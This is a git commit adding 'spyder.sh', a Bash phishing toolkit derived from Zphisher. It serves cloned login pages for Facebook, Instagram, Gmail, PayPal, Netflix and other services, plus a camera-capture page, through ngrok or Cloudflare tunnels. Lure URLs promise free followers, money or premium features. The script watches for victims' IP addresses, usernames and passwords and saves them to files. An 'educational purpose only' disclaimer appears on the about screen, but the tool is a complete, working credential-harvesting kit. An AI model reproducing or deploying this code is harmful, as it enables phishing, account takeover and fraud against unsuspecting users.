c747560d92dc362bcf790fe4b322dcc24fccc17f
Breazy <101399227+Cold-Breazy@users.noreply.github.com>
2022-07-17 01:36:46 +0200

    Add files via upload

---
+++ spyder.sh
@@ -0,0 +1,571 @@
+#!/bin/bash
+
+##   Zphisher 	: 	Automated Phishing Tool
+##   Author 	: 	TAHMID RAYAT 
+##   Version 	: 	2.2
+##   Github 	: 	https://github.com/htr-tech
+
+
+## ANSI colors (FG & BG)
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
+## Directories
+if [[ ! -d ".server" ]]; then
+	mkdir -p ".server"
+fi
+if [[ -d ".server/www" ]]; then
+	rm -rf ".server/www"
+	mkdir -p ".server/www"
+else
+	mkdir -p ".server/www"
+fi
+if [[ -e ".cld.log" ]]; then
+	rm -rf ".cld.log"
+fi
+
+## Script termination
+exit_on_signal_SIGINT() {
+    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    exit 0
+}
+
+exit_on_signal_SIGTERM() {
+    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+    exit 0
+}
+
+trap exit_on_signal_SIGINT SIGINT
+trap exit_on_signal_SIGTERM SIGTERM
+
+## Reset terminal colors
+reset_color() {
+	tput sgr0   # reset attributes
+	tput op     # reset color
+    return
+}
+
+## Kill already running process
+kill_pid() {
+	if [[ `pidof php` ]]; then
+		killall php > /dev/null 2>&1
+	fi
+	if [[ `pidof ngrok` ]]; then
+		killall ngrok > /dev/null 2>&1
+	fi
+	if [[ `pidof cloudflared` ]]; then
+		killall cloudflared > /dev/null 2>&1
+	fi
+}
+
+## Banner
+banner() {
+	cat .logo.txt <<- EOF
+
+	EOF
+}
+
+## Small Banner
+banner_small() {
+	cat .logo2.txt <<- EOF
+	EOF
+}
+
+## Dependencies
+dependencies() {
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+
+    if [[ -d "/data/data/com.termux/files/home" ]]; then
+        if [[ `command -v proot` ]]; then
+            printf ''
+        else
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+            pkg install proot resolv-conf -y
+        fi
+
+        if [[ `command -v tput` ]]; then
+            printf ''
+        else
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+            pkg install ncurses-utils -y
+        fi
+
+    fi
+
+	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+	else
+		pkgs=(php curl wget unzip)
+		for pkg in "${pkgs[@]}"; do
+			type -p "$pkg" &>/dev/null || {
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				if [[ `command -v pkg` ]]; then
+					pkg install "$pkg" -y
+				elif [[ `command -v apt` ]]; then
+					apt install "$pkg" -y
+				elif [[ `command -v apt-get` ]]; then
+					apt-get install "$pkg" -y
+				elif [[ `command -v pacman` ]]; then
+					sudo pacman -S "$pkg" --noconfirm
+				elif [[ `command -v dnf` ]]; then
+					sudo dnf -y install "$pkg"
+				else
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					{ reset_color; exit 1; }
+				fi
+			}
+		done
+	fi
+
+}
+
+## Download Ngrok
+download_ngrok() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 2>&1
+	if [[ -e "$file" ]]; then
+		unzip "$file" > /dev/null 2>&1
+		mv -f ngrok .server/ngrok > /dev/null 2>&1
+		rm -rf "$file" > /dev/null 2>&1
+		chmod +x .server/ngrok > /dev/null 2>&1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
+## Download Cloudflared
+download_cloudflared() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 2>&1
+	if [[ -e "$file" ]]; then
+		mv -f "$file" .server/cloudflared > /dev/null 2>&1
+		chmod +x .server/cloudflared > /dev/null 2>&1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
+## Install ngrok
+install_ngrok() {
+	if [[ -e ".server/ngrok" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
+		else
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
+		fi
+	fi
+
+}
+
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
+		else
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
+		fi
+	fi
+
+}
+
+## Exit message
+msg_exit() {
+	{ clear; banner; echo; }
+	echo -e "${GREENBG}${BLACK} I Hope You Enjoyed Using This Tool. Bye Bye.=""${RESETBG}\n"
+	{ reset_color; exit 0; }
+}
+
+## About
+about() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${GREEN}Author   ${RED}:  ${ORANGE}MANDISA ${RED}[ ${ORANGE}COLD-BREAZY ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/cold-breazy
+		${GREEN}Social   ${RED}:  ${CYAN}https://www.facebook.com/Mothalicious
+		${GREEN}Version  ${RED}:  ${ORANGE}2.0
+
+		${REDBG}${WHITE} Thanks : Junio Jays & Tee Viper!${RESETBG}
+
+		${RED}Warning:${WHITE}
+		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
+		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
+
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+
+	EOF
+
+	read -p "${RED}[${WHITE}=${RED}]${GREEN} Choose Option => ${BLUE}"
+
+	case $REPLY in 
+		99)
+			msg_exit;;
+		0 | 00)
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			{ sleep 1; main_menu; };;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; about; };;
+	esac
+}
+
+## Setup website and start php server
+HOST='127.0.0.1'
+PORT='8080'
+
+setup_site() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	cp -rf .sites/"$website"/* .server/www
+	cp -f .sites/ip.php .server/www/
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+}
+
+## Get IP address
+capture_ip() {
+	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
+	cat .server/www/ip.txt >> ip.txt
+}
+
+## Get credentials
+capture_creds() {
+	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
+	cat .server/www/usernames.txt >> usernames.dat
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+}
+
+## Print data
+capture_data() {
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	while true; do
+		if [[ -e ".server/www/ip.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			capture_ip
+			rm -rf .server/www/ip.txt
+		fi
+		sleep 0.75
+		if [[ -e ".server/www/usernames.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			capture_creds
+			rm -rf .server/www/usernames.txt
+		fi
+		sleep 0.75
+	done
+}
+
+## Start ngrok
+start_ngrok() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url1=${ngrok_url#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	capture_data
+}
+
+
+## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
+
+## Start Cloudflared
+start_cloudflared() { 
+        rm .cld.log > /dev/null 2>&1 &
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+    if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
+	
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	cldflr_link1=${cldflr_link#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	capture_data
+}
+
+## Start localhost
+start_localhost() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	setup_site
+	{ sleep 1; clear; banner_small; }
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	capture_data
+}
+
+## Tunnel selection
+tunnel_menu() {
+	{ clear; banner_small; }
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			start_localhost;;
+		2 | 02)
+			start_ngrok;;
+		3 | 03)
+			start_cloudflared;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; tunnel_menu; };;
+	esac
+}
+
+##Update
+site_update() {
+    clear
+    cat .logo.txt
+    cd $HOME
+    rm -rf spyder
+    git clone https://github.com/cold-breazy/spyder
+    cd spyder
+    bash spyder.sh
+}
+
+## Facebook
+site_facebook() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
+		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="facebook"
+			mask='http://blue-verified-badge-for-facebook-free'
+			tunnel_menu;;
+		2 | 02)
+			website="fb_advanced"
+			mask='http://vote-for-the-best-social-media'
+			tunnel_menu;;
+		3 | 03)
+			website="fb_security"
+			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			tunnel_menu;;
+		4 | 04)
+			website="fb_messenger"
+			mask='http://get-messenger-premium-features-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_facebook; };;
+	esac
+}
+
+## Instagram
+site_instagram() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
+		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="instagram"
+			mask='http://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		2 | 02)
+			website="ig_followers"
+			mask='http://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		3 | 03)
+			website="insta_followers"
+			mask='http://get-1000-followers-for-instagram'
+			tunnel_menu;;
+		4 | 04)
+			website="ig_verify"
+			mask='http://blue-badge-verify-for-instagram-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_instagram; };;
+	esac
+}
+
+## Gmail/Google
+site_gmail() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="google"
+			mask='http://get-unlimited-google-drive-free'
+			tunnel_menu;;		
+		2 | 02)
+			website="google_new"
+			mask='http://get-unlimited-google-drive-free'
+			tunnel_menu;;
+		3 | 03)
+			website="google_poll"
+			mask='http://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_gmail; };;
+	esac
+}
+
+## Vk
+site_vk() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="vk"
+			mask='http://vk-premium-real-method-2020'
+			tunnel_menu;;
+		2 | 02)
+			website="vk_poll"
+			mask='http://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_vk; };;
+	esac
+}
+
+## Menu
+main_menu() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+             ${RED}[${WHITE}=>${RED}]${ORANGE} BREAZY CODING'S ${RED}[${WHITE}<=${RED}]${ORANGE}
+             
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}03${RED}]${ORANGE} Snapchat        ${RED}[${WHITE}05${RED}]${ORANGE} NetFlix
+		${RED}[${WHITE}02${RED}]${ORANGE} Paypal        ${RED}[${WHITE}04${RED}]${ORANGE} Cam Hack        ${RED}[${WHITE}06${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit            ${RED}[${WHITE}UP${RED}]${ORANGE} Update 
+
+	EOF
+	
+	
+	read -p "${RED}[${WHITE}=${RED}]${GREEN} Choose Option => ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			site_facebook;;
+		2 | 02)
+			website="paypal"
+                        mask='http://get-500-usd-free-to-your-acount'
+                        tunnel_menu;;
+   up | UP)
+   site_update;;
+		3 | 03)
+			website="snapchat"
+                        mask='https://earn-money-from-snapchat'
+                        tunnel_menu;;
+		4 | 04)
+			website="cam"
+			mask='https://mtn-R366-airtime-by-allowing-photos'
+			tunnel_menu;;
+		5 | 05)
+			website="netflix"
+			mask='http://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		6 | 06)
+			website="wordpress"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	
+	esac
+}
+
+## Main
+kill_pid
+dependencies
+install_ngrok
+install_cloudflared
+main_menu
